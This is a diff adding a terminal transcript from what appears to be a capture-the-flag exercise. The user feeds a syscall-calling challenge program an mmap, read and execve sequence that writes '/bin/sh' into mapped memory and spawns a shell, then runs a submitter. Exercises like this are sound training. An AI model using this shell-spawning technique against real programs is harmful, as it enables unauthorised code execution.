@@ -1,0 +1,54 @@
+$ ./challenge 
+What do you want for rdi?
+4194304
+What do you want for rsi?
+4096
+What do you want for rdx?
+7
+What do you want for r10?
+34
+What do you want for r8?
+-1
+What do you want for r9?
+0
+What syscall number to call?
+9
+syscall(9, 400000, 1000, 7, 22, ffffffffffffffff, 0);
+Syscall returned 0x400000
+Do another (0/1)?
+1
+What do you want for rdi?
+0
+What do you want for rsi?
+4194304
+What do you want for rdx?
+7
+What do you want for r10?
+0
+What do you want for r8?
+0
+What do you want for r9?
+0
+What syscall number to call?
+0
+syscall(0, 0, 400000, 7, 0, 0, 0);
+/bin/sh1
+Syscall returned 0x7
+Do another (0/1)?
+What do you want for rdi?
+4194304
+What do you want for rsi?
+0
+What do you want for rdx?
+0
+What do you want for r10?
+0
+What do you want for r8?
+0
+What do you want for r9?
+0
+What syscall number to call?
+59
+syscall(3b, 400000, 0, 0, 0, 0, 0);
+$ ./submitter 2
+ 
